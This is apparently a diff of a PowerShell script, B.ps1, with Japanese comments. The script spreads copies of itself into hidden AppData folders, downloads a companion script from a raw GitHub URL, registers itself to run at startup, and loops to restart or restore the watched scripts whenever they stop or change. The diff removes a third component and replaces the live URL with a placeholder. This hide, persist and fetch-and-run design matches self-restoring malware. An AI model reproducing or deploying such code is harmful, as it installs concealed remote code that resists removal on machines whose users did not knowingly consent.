@@ -1,21 +1,17 @@
-# B.ps1
-
 # --- 設定 ---
 
 $SpreadDirs = @(
     "$env:APPDATA\Microsoft\Windows",   # A.ps1用
-    "$env:LOCALAPPDATA\TempData",       # B.ps1用（自身の配置先）
-    "$env:APPDATA\Packages"              # C.ps1用
+    "$env:LOCALAPPDATA\TempData"        # B.ps1用（自身の配置先）
 )
 
 $Urls = @{
-    "A" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/A.ps1"
-    "C" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/C.ps1"
+    "A" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/A.ps1"
 }
 
 $RegNameB = "OrgScriptB"
 
-
+# --- 関数群 ---
 
 function SetHiddenAttribute($path) {
     if (Test-Path $path) {
@@ -108,9 +104,8 @@ foreach ($dir in $SpreadDirs) {
     }
 }
 
-# A と C の最新コードを復元・取得
+# A の最新コードを復元・取得
 $PathA = StartupCheckAndRestore "A.ps1" $Urls["A"] $SpreadDirs[0]
-$PathC = StartupCheckAndRestore "C.ps1" $Urls["C"] $SpreadDirs[2]
 
 # スタートアップ登録（B.ps1の現在の実行パス）
 CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path
@@ -118,12 +113,10 @@ CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path
 # 監視対象スクリプトのハッシュを保持
 $MonitorScripts = @{
     "A.ps1" = Get-FileSHA256 $PathA
-    "C.ps1" = Get-FileSHA256 $PathC
 }
 
 $MonitorPaths = @{
     "A.ps1" = $PathA
-    "C.ps1" = $PathC
 }
 
 # 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
@@ -142,5 +135,5 @@ while ($true) {
             }
         }
     }
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 6
 }
